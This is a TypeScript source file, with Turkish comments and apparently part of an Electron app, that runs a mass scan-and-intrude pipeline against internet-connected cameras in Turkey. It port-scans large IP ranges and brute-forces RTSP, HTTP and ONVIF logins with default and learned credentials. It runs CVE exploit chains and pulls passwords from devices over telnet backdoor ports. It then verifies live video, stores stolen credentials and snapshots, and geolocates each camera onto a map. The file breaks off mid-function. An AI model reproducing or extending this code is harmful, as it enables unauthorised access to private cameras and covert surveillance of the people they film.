// V2 — Motor orkestrasyonu. Keşif → sızma → sağlık → thumbnail → zamanlama.

import { spawn } from 'child_process';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { app } from 'electron';
import { CameraStore, DeviceRecord, DeviceVendor, DeviceStatus } from './db';
import { CameraRegistry, hashId, RegisteredCamera, CamProtocol } from './registry';
import { Scheduler } from './scheduler';
import { buildScanQueue } from './targets';
import { activeScan, grabBanner, fingerprint, confirmVendor, SCAN_PORTS } from './recon';
import { Infiltrator, AccessResult, DEFAULT_CREDS } from './intrusion';
import { runExploitChain } from './exploits';
import { StreamEngine } from './stream';
import { hikvisionLogin, dahuaLogin, hikvisionChannelCount, dahuaChannelCount } from './vendor-auth';
import { discoverStreams } from './channels';
import { scrapePublic } from './public-scrapers';
import { upnpCameraUrls } from './upnp';
import { GeoLocator } from './geoip';
import { scanPort, quickRtsp, rtspAlive, rtspBanner, rtspVendor, MASS_CREDS } from './massscan';
import { tryProprietaryAuth, dahuaRtspPath, hikRtspPath } from './proprietary';
import { runCloudScan } from './cloud';
import { onvifProbe, onvifStreams } from './onvif';
import { internetDb } from './internetdb';
import { validateBatch, validateStream } from './validate';
import { scanIotPorts, telnetExtract } from './telnet';

const WEB_PORTS = new Set([80, 8080, 8000]);
const offlineSince = new Map<string, number>();
const offlineFail = new Map<string, number>();
const geoLocator = new GeoLocator();

// --- ffmpeg SERT TAVANI (kanıtlı kök neden) ---------------------------------
// stream.ts'te MAX_SESSIONS=12 var ama verifyStream/snapshotJpeg SINIRSIZDI.
// 60 RTSP worker'ı aynı anda ffmpeg açıyordu → makine boğuluyor → gerçek kamera
// bile 6sn timeout'u aşıyordu (canlı test: tek kamera 4858ms) → LIVE hiç olmuyordu.
const FFMPEG_MAX = 6;
let ffmpegRunning = 0;
const ffmpegWaiters: Array<() => void> = [];
function acquireFfmpeg(): Promise<void> {
  if (ffmpegRunning < FFMPEG_MAX) {
    ffmpegRunning++;
    return Promise.resolve();
  }
  return new Promise((res) => ffmpegWaiters.push(res));
}
function releaseFfmpeg(): void {
  ffmpegRunning = Math.max(0, ffmpegRunning - 1);
  const next = ffmpegWaiters.shift();
  if (next) {
    ffmpegRunning++;
    next();
  }
}

// ffmpeg hatasını görünür yap (eskiden stderr 'ignore' → kör uçuş).
let lastFfmpegErr = '';
export function lastFfmpegError(): string {
  return lastFfmpegErr;
}
function noteFfmpegErr(t: string): void {
  const line = t
    .split(/\r?\n/)
    .map((s) => s.trim())
    .filter((s) => /error|failed|unauthorized|timed out|refused|invalid/i.test(s))
    .pop();
  if (line) lastFfmpegErr = line.slice(0, 200);
}

async function verifyStream(url: string, timeoutMs = 15000): Promise<boolean> {
  await acquireFfmpeg();
  try {
    return await new Promise<boolean>((resolve) => {
      const proc = spawn(
        'ffmpeg',
        ['-rtsp_transport', 'tcp', '-rtsp_flags', 'prefer_tcp', '-fflags', 'nobuffer', '-i', url, '-an', '-frames:v', '3', '-f', 'image2pipe', '-vcodec', 'mjpeg', '-'],
        { stdio: ['ignore', 'pipe', 'pipe'] },
      );
      const chunks: Buffer[] = [];
      let bytes = 0;
      let settled = false;
      const finish = (v: boolean) => {
        if (settled) return;
        settled = true;
        try { proc.kill(); } catch { /* noop */ }
        resolve(v);
      };
      const timer = setTimeout(() => finish(false), timeoutMs);
      proc.stdout.on('data', (c: Buffer) => {
        bytes += c.length;
        chunks.push(c);
        // Yeterli kare geldiyse erken çık (timeout'u bekleme).
        if (bytes > 3000) {
          clearTimeout(timer);
          finish(true);
        }
      });
      proc.stderr.on('data', (c: Buffer) => noteFfmpegErr(c.toString('utf8')));
      proc.stdout.on('end', () => {
        clearTimeout(timer);
        // 3 kare gelmeli (>3000 byte) → SÜREKLİ video kanıtı. Tek kare = sahte/statik.
        finish(bytes > 3000);
      });
      proc.on('error', () => {
        clearTimeout(timer);
        finish(false);
      });
    });
  } finally {
    releaseFfmpeg();
  }
}

async function snapshotJpeg(url: string, timeoutMs = 12000): Promise<Buffer | null> {
  await acquireFfmpeg();
  try {
    return await new Promise<Buffer | null>((resolve) => {
      const proc = spawn(
        'ffmpeg',
        ['-rtsp_transport', 'tcp', '-i', url, '-frames:v', '1', '-f', 'image2pipe', '-vcodec', 'mjpeg', '-'],
        { stdio: ['ignore', 'pipe', 'pipe'] },
      );
      const chunks: Buffer[] = [];
      let settled = false;
      const finish = (v: Buffer | null) => {
        if (settled) return;
        settled = true;
        try { proc.kill(); } catch { /* noop */ }
        resolve(v);
      };
      const timer = setTimeout(() => finish(null), timeoutMs);
      proc.stdout.on('data', (c: Buffer) => chunks.push(c));
      proc.stderr.on('data', (c: Buffer) => noteFfmpegErr(c.toString('utf8')));
      proc.stdout.on('end', () => {
        clearTimeout(timer);
        finish(chunks.length ? Buffer.concat(chunks) : null);
      });
      proc.on('error', () => {
        clearTimeout(timer);
        finish(null);
      });
    });
  } finally {
    releaseFfmpeg();
  }
}

function toRegistered(d: DeviceRecord): RegisteredCamera {
  const online = d.status === 'LIVE';
  const offline = d.status === 'OFFLINE' || d.status === 'DEAD';
  return {
    id: d.id,
    name: `${d.ip}:${d.port}`,
    il: d.city,
    ilce: d.district,
    lat: d.lat,
    lon: d.lon,
    protocol: (d.protocol || 'unknown') as CamProtocol,
    url: d.url,
    // LIVE=online · OFFLINE/DEAD=offline · gerisi (ACCESSIBLE/DISCOVERED)=unknown
    status: online ? 'online' : offline ? 'offline' : 'unknown',
    source: (d.source === 'intrusion' ? 'intrusion' : 'scan') as RegisteredCamera['source'],
    lastSeen: d.lastSeen || null,
    latencyMs: null,
  };
}

// Türkiye sınır kutusu. Anahtar/API gerektirmez ve 91.184.0.0/13 gibi bloklarda
// TR'ye ait OLMAYAN tahsisleri (Belçika/Rusya/İran/Polonya) kesin ayırır.
// Konum bilinmiyorsa (0,0) eleme yapılmaz — İBB/UPnP kayıtları koordinatsız olabilir.
function geoAllowed(lat: number, lon: number): boolean {
  if (!Number.isFinite(lat) || !Number.isFinite(lon) || (lat === 0 && lon === 0)) return true;
  return lat >= 35.5 && lat <= 42.5 && lon >= 25.5 && lon <= 45.0;
}

export function storeStats(store: CameraStore) {
  const all = store.listDevices();
  return {
    total: all.length,
    live: all.filter((d) => d.status === 'LIVE').length,
    discovered: all.filter((d) => d.status === 'DISCOVERED').length,
    accessible: all.filter((d) => d.status === 'ACCESSIBLE').length,
    offline: all.filter((d) => d.status === 'OFFLINE').length,
    dead: all.filter((d) => d.status === 'DEAD').length,
    inaccessible: all.filter((d) => d.status === 'INACCESSIBLE').length,
  };
}

export async function runReconScan(
  store: CameraStore,
  registry: CameraRegistry,
  ipBudget = 20000,
): Promise<number> {
  const q = await buildScanQueue();
  const posRaw = store.getMeta('scan-cursor');
  if (posRaw) {
    try {
      q.restore(JSON.parse(posRaw));
    } catch {
      /* bad cursor — start fresh */
    }
  }
  const ips: string[] = [];
  let budget = ipBudget;
  while (budget > 0) {
    const batch = q.next(Math.min(budget, 2000));
    if (!batch.length) break;
    ips.push(...batch);
    budget -= batch.length;
  }
  if (!ips.length) return 0;

  const open = await activeScan(ips, SCAN_PORTS, 500, 3000);
  let added = 0;
  let idx = 0;
  const workers = Array.from({ length: Math.min(12, Math.max(open.length, 1)) }, async () => {
    while (idx < open.length) {
      const { ip, port } = open[idx++];
      let vendor: string;
      if (WEB_PORTS.has(port)) {
        const banner = await grabBanner(ip, port);
        vendor = fingerprint(banner.server, banner.title);
        vendor = await confirmVendor(ip, port, vendor);
        if (vendor === 'generic' && !banner.server && !banner.title) continue;
      } else {
        vendor = 'generic';
      }

      const id = hashId(`${ip}:${port}`);
      const existing = store.getDevice(id);
      const device: DeviceRecord = {
        id,
        ip,
        port,
        vendor: vendor as DeviceVendor,
        model: '',
        city: existing?.city || '',
        district: existing?.district || '',
        lat: existing?.lat || 0,
        lon: existing?.lon || 0,
        status: existing?.status || 'DISCOVERED',
        protocol: port === 554 || port === 8554 ? 'rtsp' : 'http',
        url: existing?.url || '',
        username: existing?.username || '',
        password: existing?.password || '',
        source: 'scan',
        firstSeen: existing?.firstSeen || Date.now(),
        lastSeen: Date.now(),
        lastExploit: existing?.lastExploit || 0,
      };
      const gd = await ensureGeo(device);
      store.upsertDevice(gd);
      if (!registry.get(id)) {
        registry.add(toRegistered(gd));
        added++;
      }
    }
  });
  await Promise.all(workers);

  store.setMeta('scan-cursor', JSON.stringify(q.getPosition()));
  registry.save();

  await runVendorAuthExploit(store, registry);
  await runExploitPass(store, registry);

  return added;
}

export async function runExploitPass(store: CameraStore, registry: CameraRegistry): Promise<number> {
  const targets = store
    .listDevices()
    .filter((d) => d.status === 'DISCOVERED' || d.status === 'DEAD' || d.status === 'INACCESSIBLE');
  let success = 0;
  let idx = 0;
  const workers = Array.from({ length: Math.min(30, Math.max(targets.length, 1)) }, async () => {
    const inf = new Infiltrator(2000);
    while (idx < targets.length) {
      const d = targets[idx++];
      let access: AccessResult | null = null;
      try {
        if (d.port === 554 || d.port === 8554) {
          access = await inf.accessRtsp(d.ip, d.port);
        } else {
          access = await inf.accessHttp(d.ip, d.port);
          if (!access) access = await inf.accessOnvif(d.ip, d.port);
        }
      } catch {
        access = null;
      }

      if (access) {
        store.recordCredSuccess(d.vendor, access.username, access.password);
        store.logAccess(d.id, `brute-${access.vector}`, `${access.username}:${access.password}`, true);
        const plays = access.protocol === 'rtsp' ? await verifyStream(access.url) : true;
        const status: DeviceStatus = plays ? 'LIVE' : 'ACCESSIBLE';
        const live: DeviceRecord = {
          ...d,
          username: access.username,
          password: access.password,
          url: access.url,
          protocol: access.protocol,
          status,
          lastSeen: Date.now(),
          lastExploit: Date.now(),
        };
        store.upsertDevice(live);
        if (plays) {
          if (registry.get(d.id)) {
            registry.update(d.id, { url: access.url, status: 'online', lastSeen: Date.now() });
          } else {
            registry.add(toRegistered(live));
          }
        }
        success++;
        continue;
      }

      const results = await runExploitChain(d.vendor, d.ip, d.port);
      let exploited = false;
      for (const r of results) {
        store.logAccess(d.id, r.cve, '', r.ok);
        if (r.ok && r.creds.length) {
          const [u, p] = r.creds[0];
          store.recordCredSuccess(d.vendor, u, p);
          store.upsertDevice({
            ...d,
            username: u,
            password: p,
            status: 'ACCESSIBLE',
            lastSeen: Date.now(),
            lastExploit: Date.now(),
          });
          exploited = true;
          success++;
        }
      }

      if (!exploited) {
        store.upsertDevice({ ...d, status: 'INACCESSIBLE', lastSeen: Date.now() });
      }
    }
  });
  await Promise.all(workers);

  registry.save();
  return success;
}

export async function runHealthCheck(
  store: CameraStore,
  registry: CameraRegistry,
  engine: StreamEngine,
): Promise<void> {
  // ⚠️ ESKİDEN sadece store'da 'LIVE' olanlar kontrol ediliyordu. Bizim kameralar
  // store'da 'ACCESSIBLE' (tarama anında video doğrulanmamış) → HİÇ kontrol
  // edilmiyorlardı → registry'de asla 'online' olmuyorlardı → AKTİF hep 0.
  // Artık: registry'deki TÜM url'li kayıtlar GERÇEK oynatma testinden geçer.
  const byId = new Map(store.listDevices().map((d) => [d.id, d]));
  // Maliyet kontrolü: tur başına 8 kayıt, 2 eşzamanlı, 6sn test. (Eskiden 16 kayıt
  // / 4 eşzamanlı / 9sn idi → ffmpeg havuzunu doldurup OYNATMAYI aç bırakıyordu.)
  const targets = registry
    .all()
    .filter((c) => c.url && c.protocol !== 'demo')
    .slice(0, 8);
  const now = Date.now();
  let idx = 0;
  const workers = Array.from({ length: Math.min(2, Math.max(targets.length, 1)) }, async () => {
    while (idx < targets.length) {
      const c = targets[idx++];
      const d = byId.get(c.id);
      // Zaten online olan kamera için ffmpeg harcamayız (ucuz TCP kontrolü yeter) —
      // yalnız 'unknown/offline' olanlar gerçek oynatma testinden geçer. Böylece
      // health-check ffmpeg havuzunu doldurup OYNATMAYI aç bırakmaz.
      if (c.status === 'online') {
        const reachable = await engine.probe(c.url, 4000);
        if (reachable) {
          offlineFail.delete(c.id);
          registry.update(c.id, { status: 'online', lastSeen: now });
          continue;
        }
      }
      const plays =
        c.protocol === 'rtsp'
          ? await verifyStream(c.url, 12000)
          : await validateStream(c.url, c.protocol, 12000);
      if (plays) {
        offlineSince.delete(c.id);
        offlineFail.delete(c.id);
        if (d) store.setDeviceStatus(d.id, 'LIVE', now);
        registry.update(c.id, { status: 'online', lastSeen: now });
      } else {
        const fails = (offlineFail.get(c.id) || 0) + 1;
        offlineFail.set(c.id, fails);
        if (fails < 2) continue; // geçici kopma — hemen offline basma
        offlineFail.delete(c.id);
        const since = offlineSince.get(c.id) || now;
        offlineSince.set(c.id, since);
        if (d) store.setDeviceStatus(d.id, now - since > 5 * 60_000 ? 'DEAD' : 'OFFLINE', now);
        // url'i olan kayıt ARAYÜZDE KALIR (kırmızı/offline) ve 60sn sonra tekrar
        // denenir. Eskiden burada siliniyordu → kamera bir kez yanlış "offline"
        // damgası yiyince listeden tamamen kayboluyordu ("arayüzde hiç kamera yok").
        if (c.url) registry.update(c.id, { status: 'offline', lastSeen: now });
        else registry.purge((x) => x.id === c.id);
      }
    }
  });
  await Promise.all(workers);
  registry.save();
}

export async function runThumbnails(store: CameraStore): Promise<number> {
  const live = store.listDevices('LIVE');
  let n = 0;
  let idx = 0;
  // E: SINIRLI havuz (4 eşzamanlı) + nefes payı → ana tarama döngüsünü kilitlemez.
  const workers = Array.from({ length: Math.min(4, Math.max(live.length, 1)) }, async () => {
    while (idx < live.length) {
      const d = live[idx++];
      const url = d.url || `rtsp://${d.ip}:${d.port}/`;
      const jpeg = await snapshotJpeg(url);
      if (jpeg && jpeg.length > 500) {
        store.saveThumb(d.id, jpeg);
        n++;
      }
      await new Promise((r) => setTimeout(r, 150));
    }
  });
  await Promise.all(workers);
  return n;
}

// STORE → REGISTRY KÖPRÜSÜ (kritik): mass-scan döngü başına 100k IP tarar ama
// TR evreni ~20M IP → bilinen bir cihazın TEKRAR taranması SAATLER alır. Bu
// yüzden store'da kimlik tutmuş (url'li) cihazlar arayüze hiç düşmüyordu.
export async function runRegistryBackfill(store: CameraStore, registry: CameraRegistry): Promise<number> {
  // 1) YABANCI TEMİZLİĞİ: geo'su Türkiye dışındaki kayıtları arayüzden çıkar.
  //    91.184.0.0/13 gibi bloklar TR'ye ait değil → Belçika/Rusya/İran çıkıyordu.
  const dropped = registry.purge((c) => !geoAllowed(c.lat, c.lon));
  if (dropped > 0) console.log(`[Backfill] ${dropped} yabancı kayıt arayüzden çıkarıldı`);

  // 1b) Store'da ÖLÜ işaretlenmiş kayıtları arayüzden düş — tıklanınca hata veren
  //     bayat kameralar listeyi kirletmesin (health-check bunları OFFLINE yapar).
  const byId = new Map(store.listDevices().map((d) => [d.id, d]));
  const deadN = registry.purge((c) => {
    const d = byId.get(c.id);
    // ⚠️ url'i OLAN cihaz arayüzden ATILMAZ: sadece gri (unknown) olur. Eskiden
    // OFFLINE işaretlenen her kayıt siliniyordu → çalışan kamera bir kez
    // yanlış "offline" damgası yiyince listeden tamamen kayboluyordu.
    return !!d && !d.url && (d.status === 'OFFLINE' || d.status === 'DEAD');
  });
  if (deadN > 0) console.log(`[Backfill] ${deadN} ölü kayıt arayüzden çıkarıldı`);

  // 2) Store'daki GERÇEKTEN oynayan (health-check 'LIVE' yapmış) cihazları taşı.
  //    ⚠️ Eskiden 'ACCESSIBLE' de taşınıyordu → health-check'in oynamadığı için
  //    attığı kamerayı backfill 60sn sonra GERİ EKLİYORDU (ikisi kavga ediyordu).
  //    Artık: yalnız gerçek oynatma testinden geçmiş (LIVE) cihazlar arayüze girer.
  // Arayüz BOŞ KALMASIN: kimlik tutmuş (url'li) cihazlar 'unknown' (gri) gösterilir.
  // Health-check gerçek oynatma testinden geçirirse 'online' (yeşil) olur; geçmezse
  // gri kalır ya da düşer. Eskiden ACCESSIBLE'lar yanlışlıkla 'online' görünüyordu;
  // artık health-check ffmpeg ile doğruladığı için gri/yeşil ayrımı DÜRÜST.
  const fresh: RegisteredCamera[] = [];
  for (const d of store.listDevices()) {
    if (!d.url) continue;
    // DURUM FİLTRESİ YOK: url'i olan her cihaz arayüze girer (gri/unknown).
    // Yeşile dönmesi için health-check'in gerçek oynatma testinden geçmesi gerekir.
    // (Eskiden yalnız LIVE/ACCESSIBLE alınıyordu; 12 cihazın hepsi OFFLINE olduğu
    //  için liste BOŞ kalıyordu.)
    if (!geoAllowed(d.lat, d.lon)) continue;
    const cam = toRegistered(d);
    const cur = registry.get(cam.id);
    if (!cur) fresh.push(cam);
    else if (cur.status !== cam.status) registry.update(cam.id, { status: cam.status, url: cam.url });
  }
  const n = fresh.length ? registry.addMany(fresh) : 0;
  if (n > 0) console.log(`[Backfill] store'dan ${n} cihaz arayüze alındı`);
  return n;
}

// IOT GİRİŞ KANALI: telnet/backdoor portlarını tarar, şifreyi CİHAZIN KENDİ
// config dosyasından OKUR ve okunan şifreyle RTSP'i doğrular. Şifre tahmini
// (credential stuffing) ortadan kalkar — asıl sızma yolu budur.
export async function runIotScan(store: CameraStore, registry: CameraRegistry, ipBudget = 30000): Promise<number> {
  const hitIps = store
    .listDevices()
    .filter((d) => d.protocol === 'rtsp')
    .map((d) => d.ip);
  const q = await buildScanQueue(hitIps);
  const posRaw = store.getMeta('iot-cursor');
  if (posRaw) {
    try {
      q.restore(JSON.parse(posRaw));
    } catch {
      /* fresh */
    }
  }
  const ips: string[] = [];
  let budget = ipBudget;
  while (budget > 0) {
    const b = q.next(Math.min(budget, 10000));
    if (!b.length) {
      q.reset();
      const again = q.next(Math.min(budget, 10000));
      if (!again.length) break;
      ips.push(...again);
      budget -= again.length;
      continue;
    }
    ips.push(...b);
    budget -= b.length;
  }
  store.setMeta('iot-cursor', JSON.stringify(q.getPosition()));

  const open = await scanIotPorts(ips, 800, 900);
  if (!open.length) {
    store.setMeta('iot-open', String(Number(store.getMeta('iot-open') || '0') + 0));
    return 0;
  }
  store.setMeta('iot-open', String(Number(store.getMeta('iot-open') || '0') + open.length));

  let found = 0;
  let idx = 0;
  const workers = Array.from({ length: Math.min(10, Math.max(open.length, 1)) }, async () => {
    while (idx < open.length) {
      const t = open[idx++];
      const f = await telnetExtract(t.ip, t.port, 6000);
      if (!f) continue;
      store.logAccess(hashId(`iot:${t.ip}`), `iot-telnet-${t.port}`, `${f.user}:${f.pass}`, true);
      const geo = await geoLocator.resolve(t.ip);
      if (!geoAllowed(geo?.lat ?? 0, geo?.lon ?? 0)) continue;
      const auth = f.user || f.pass ? `${encodeURIComponent(f.user)}:${encodeURIComponent(f.pass)}@` : '';
      const paths = [
        '/Streaming/Channels/101',
        '/cam/realmonitor?channel=1&subtype=0',
        '/h264/ch1/main/av_stream',
        '/onvif1',
      ];
      for (const path of paths) {
        const url = `rtsp://${auth}${t.ip}:554${path}`;
        if (!(await verifyStream(url, 12000))) continue;
        const id = hashId(url);
        const dev: DeviceRecord = {
          id,
          ip: t.ip,
          port: 554,
          vendor: 'generic',
          model: `${f.vendor} (telnet:${t.port})`,
          city: geo?.il || '',
          district: geo?.ilce || '',
          lat: geo?.lat || 0,
          lon: geo?.lon || 0,
          status: 'LIVE',
          protocol: 'rtsp',
          url,
          username: f.user,
          password: f.pass,
          source: 'scan',
          firstSeen: Date.now(),
          lastSeen: Date.now(),
          lastExploit: Date.now(),
        };
        store.upsertDevice(dev);
        store.recordCredSuccess('generic', f.user, f.pass);
        if (!registry.get(id)) registry.add(toRegistered(dev));
        found++;
        break;
      }
    }
  });
  // Watchdog: worker takılırsa döngü durmasın (telnet oturumları sert timeout'lu).
  await Promise.race([
    Promise.all(workers),
    new Promise<void>((r) => {
      const tm = setTimeout(() => r(), 8 * 60_000);
      tm.unref?.();
    }),
  ]);
  registry.save();
  return found;
}

export async function runMassScan(
  store: CameraStore,
  registry: CameraRegistry,
  ipBudget = 100000,
): Promise<number> {
  // ADAPTİF KUYRUK: daha önce kamera/erişim veren IP'lerin bölgelerini öne al.
  // ADAPTİF KUYRUK: öğrenme sinyali = RTSP portu AÇIK çıkmış TÜM IP'ler (532 adet),
  // sadece cred tutan 10 tanesi DEĞİL. Ölçüm: 800k IP'de 90 açık port (%0.011) —
  // yani yoğunluk sinyalini 50x güçlendirmek aynı 100k IP'de kat kat daha çok
  // açık kamera bulur (kuyruk bu /16'ları öne alır).
  const hitIps = store
    .listDevices()
    .filter((d) => d.protocol === 'rtsp' || d.status === 'LIVE' || d.status === 'ACCESSIBLE')
    .map((d) => d.ip);
  // C: /16 tarama sayaçları (kalıcı) — boş aralık cooldown'ı için.
  const scanCounts = new Map<number, number>();
  try {
    const raw = store.getMeta('p16-scan');
    if (raw) {
      for (const [k, v] of Object.entries(JSON.parse(raw) as Record<string, number>)) {
        scanCounts.set(Number(k), Number(v));
      }
    }
  } catch {
    /* fresh */
  }
  const q = await buildScanQueue(hitIps, scanCounts);
  // Kuyruk şeması değişti (TR-only) → eski cursor geçersiz, baştan başla.
  const QUEUE_VER = 'tr-v3';
  if (store.getMeta('queue-ver') !== QUEUE_VER) {
    store.setMeta('queue-ver', QUEUE_VER);
    store.setMeta('scan-cursor', '');
    store.setMeta('scan-total', '0');
  }
  const posRaw = store.getMeta('scan-cursor');
  if (posRaw) {
    try {
      q.restore(JSON.parse(posRaw));
    } catch {
      /* fresh */
    }
  }

  // TEK SEFERLİK GÖÇ: eski YABANCI/konumsuz kayıtları temizle (TR-only'a geçiş).
  // ⚠️ Eskiden HER 15sn koşuyordu → koordinatsız ama geçerli kayıtları
  // (UPnP / public-scrape) de siliyordu. Artık tek sefer + url'i olanı korur.
  if (store.getMeta('tr-purge-v1') !== 'done') {
    try {
      registry.purge((c) => c.protocol !== 'demo' && !c.verified && !c.url && c.lat === 0 && c.lon === 0);
    } catch {
      /* noop */
    }
    store.setMeta('tr-purge-v1', 'done');
  }
  const ips: string[] = [];
  let budget = ipBudget;
  while (budget > 0) {
    const b = q.next(Math.min(budget, 20000));
    if (!b.length) {
      // Kuyruk bitti → baştan başla (IP'ler TEKRAR taransın, kamera kaçmasın).
      q.reset();
      const again = q.next(Math.min(budget, 20000));
      if (!again.length) break; // boş kuyruk → çık
      ips.push(...again);
      budget -= again.length;
      continue;
    }
    ips.push(...b);
    budget -= b.length;
  }
  if (!ips.length) return 0;

  // SAYAÇ ANINDA: döngü bitmeden yürüsün + uygulama kapansa da kalıcı olsun.
  // (Eski hata: yalnızca döngü SONUNDA yazılıyordu → 15 dk boyunca 0 görünüyordu.)
  // Cursor döngü SONUNDA ilerler → yarıda kalsa da IP atlanmaz.
  const prevScanned = Number(store.getMeta('scan-total') || '0');
  store.setMeta('scan-total', String(prevScanned + ips.length));

  // RTSP portları: 554 + alternatifler. SIRAYLA, 3000 eşzamanlı.
  // (Paralel 4 port × 2000 = 8000 socket OS/ISP'de düşüyordu → sahte "az bulundu".)
  // ÖĞRENİLMİŞ global kimlik hot-list — her cihazda ilk bunlar denenir (A maddesi).
  const hotCreds = store.topCreds(24);

  // KAYNAK EŞİĞİ (D): bellek darsa eşzamanlılığı otomatik düşür (donma/takılma önler).
  const freeRatio = os.freemem() / Math.max(os.totalmem(), 1);
  const rtspConc = freeRatio < 0.12 ? 700 : freeRatio < 0.25 ? 1100 : 1500;

  const RTSP_PORTS = [554, 8554, 10554, 1554];
  const openTargets: { ip: string; port: number }[] = [];
  for (const p of RTSP_PORTS) {
    const hits = await scanPort(ips, p, rtspConc, 900);
    // TCP-open yetmez — RTSP konuşanları doğrula (ISP NAT/yalan portları ele).
    let vi = 0;
    const vworkers = Array.from({ length: Math.min(150, Math.max(hits.length, 1)) }, async () => {
      while (vi < hits.length) {
        const ip = hits[vi++];
        if (await rtspAlive(ip, p, 1200)) openTargets.push({ ip, port: p });
      }
    });
    await Promise.all(vworkers);
  }

  const openIps = openTargets;
  // Kanıt: bulunan açık RTSP sayısı (kümülatif) — arayüzde canlı görünür.
  store.setMeta('scan-open', String(Number(store.getMeta('scan-open') || '0') + openIps.length));
  // FAZ KALP ATIŞI: scan.log eskiden yalnızca döngü SONUNDA yazılıyordu → hangi
  // fazda takıldığı görünmüyordu (4 saat kör kaldık). Artık her faz işaretlenir.
  try {
    fs.appendFileSync(
      path.join(app.getPath('userData'), 'scan.log'),
      `${new Date().toISOString()} PHASE port-tarama-bitti rtspAcik=${openIps.length}\n`,
    );
  } catch {
    /* noop */
  }
  let live = 0;
  let urlOk = 0;
  let idx = 0;
  let processed = 0;
  const workers = Array.from({ length: Math.min(24, Math.max(openIps.length, 1)) }, async () => {
    while (idx < openIps.length) {
      const t = openIps[idx++];
      const ip = t.ip;
      const port = t.port;

      // GEO: ülke ADI yerine SINIR KUTUSU. (ip-api bazen TR IP'ye "Flanders" gibi
      // yanlış country döndürüp ÇALIŞAN kamerayı eliyordu.) Konum yoksa eleme YOK.
      const geo = await geoLocator.resolve(ip);
      if (!geoAllowed(geo?.lat ?? 0, geo?.lon ?? 0)) {
        processed++;
        if (processed % 10 === 0) {
          registry.save();
          store.setMeta('scan-cursor', JSON.stringify(q.getPosition()));
        }
        continue;
      }
      const city = geo?.il || '';
      const district = geo?.ilce || '';
      const lat = geo?.lat || 0;
      const lon = geo?.lon || 0;

      const id = hashId(`rtsp://${ip}:${port}`);
      let qr = await quickRtsp(ip, port, 2000, hotCreds);
      if (!qr) {
        // InternetDB (ücretsiz, anahtarsız): bu IP'nin DİĞER açık RTSP portlarını dene.
        const idb = await internetDb(ip);
        for (const p of idb?.ports || []) {
          if (p !== port && (p === 554 || p === 8554 || p === 10554 || p === 1554)) {
            const alt = await quickRtsp(ip, p, 2000, hotCreds);
            if (alt) {
              qr = alt;
              break;
            }
          }
        }
      }
      const vendor = rtspVendor(await rtspBanner(ip, port)) as DeviceVendor;
      let status: DeviceStatus = 'DISCOVERED';
      let url = '';
      let user = '';
      let pass = '';
      if (qr) {
        url = qr.url;
        user = qr.user;
        pass = qr.pass;
        // 15sn: gerçek kamera bile ilk kareye 4.9sn'de geliyor (canlı ölçüm).
        const plays = await verifyStream(url, 15000);
        if (plays) {
          status = 'LIVE';
          live++;
          store.recordCredSuccess(vendor, user, pass);
        } else {
          status = 'ACCESSIBLE';
        }
      }
      const device: DeviceRecord = {
        id,
        ip,
        port,
        vendor,
        model: '',
        city,
        district,
        lat,
        lon,
        status,
        protocol: 'rtsp',
        url,
        username: user,
        password: pass,
        source: 'scan',
        firstSeen: Date.now(),
        lastSeen: Date.now(),
        lastExploit: 0,
      };
      // SADECE gerçekten erişilebilen/görüntü veren cihazları sakla (junk yok).
      if (qr) {
        urlOk++;
        store.upsertDevice(device);
      }
      // LIVE → online. Kimlik TUTAN (url var) ama video doğrulanamayan cihaz da
      // grid'e düşer ('unknown') — eskiden hiç görünmüyordu, "0 kamera" sanılıyordu.
      if (status === 'LIVE') {
        if (registry.get(id)) registry.update(id, { url, status: 'online' });
        else registry.add(toRegistered(device));
      } else if (qr) {
        if (registry.get(id)) registry.update(id, { url, status: 'unknown' });
        else registry.add(toRegistered(device));
      }
      processed++;
      if (processed % 10 === 0) {
        registry.save();
        store.setMeta('scan-cursor', JSON.stringify(q.getPosition()));
      }
    }
  });
  // WATCHDOG: bir worker/cihaz takılırsa döngü ASLA süresiz durmasın.
  // Kanıt: 20:29'da cred fazında 3 SAAT takıldı — cursor @1319708607'de dondu,
  // scan-total 200k arttı ama hiçbir döngü bitmedi. 5 dk sonra devam edilir.
  const stuck = await Promise.race([
    Promise.all(workers).then(() => false),
    new Promise<boolean>((r) => {
      const tm = setTimeout(() => r(true), 5 * 60_000);
      tm.unref?.();
    }),
  ]);
  if (stuck) {
    try {
      fs.appendFileSync(
        path.join(app.getPath('userData'), 'scan.log'),
        `${new Date().toISOString()} PHASE WATCHDOG cred-fazi-5dk-asti urlOk=${urlOk}\n`,
      );
    } catch {
      /* noop */
    }
  }

  // HTTP/CVE ve proprietary taramalarını PARALEL koştur.
  // ⚠️ ÖLÇÜM: 533 cihazın 532'si port 554, 1'i 37777, 0'ı 80/8080/8000.
  // Bu iki tarama her döngüde 80/8080/37777/8000'i 100k IP'de tarıyordu =
  // döngü süresinin ~yarısı, karşılığı ~0 cihaz (TR'de bu portlar kapalı).
  // %5 örneklemeye indiriyoruz: yetenek kalır, maliyet 20x düşer.
  try {
    fs.appendFileSync(
      path.join(app.getPath('userData'), 'scan.log'),
      `${new Date().toISOString()} PHASE cred-fazi-bitti urlOk=${urlOk} live=${live}\n`,
    );
  } catch {
    /* noop */
  }
  const sampleIps = ips.slice(0, 5000);
  const [cveLive, propLive] = await Promise.all([
    httpCveScan(store, registry, sampleIps),
    proprietaryScan(store, registry, sampleIps),
  ]);
  live += cveLive + propLive;

  store.setMeta('scan-cursor', JSON.stringify(q.getPosition()));
  // C: bu batch'in /16'larını say (boş prefix cooldown'ı öğrenir).
  try {
    const seen16 = new Set<number>();
    for (const ip of ips) {
      const p = ip.split('.').map(Number);
      if (p.length === 4) seen16.add(((p[0] << 8) | p[1]) >>> 0);
    }
    for (const k of seen16) scanCounts.set(k, (scanCounts.get(k) || 0) + 1);
    if (scanCounts.size > 30000) {
      const top = [...scanCounts.entries()].sort((a, b) => b[1] - a[1]).slice(0, 30000);
      scanCounts.clear();
      for (const [k, v] of top) scanCounts.set(k, v);
    }
    store.setMeta('p16-scan', JSON.stringify(Object.fromEntries(scanCounts)));
  } catch {
    /* noop */
  }

  // Kanıt: her döngü telemetrisi (userData/scan.log) — gerçekten tarandığının izi.
  try {
    const pos = q.getPosition();
    const ffErr = lastFfmpegError();
    fs.appendFileSync(
      path.join(app.getPath('userData'), 'scan.log'),
      `${new Date().toISOString()} batch=${ips.length} rtspOpen=${openIps.length} urlOk=${urlOk} httpCve=${cveLive} proprietary=${propLive} live=${live} reg=${registry.all().length} cursor=${pos.cidr}@${pos.cursor} ffmpeg=${ffErr || 'ok'}\n`,
    );
  } catch {
    /* noop */
  }
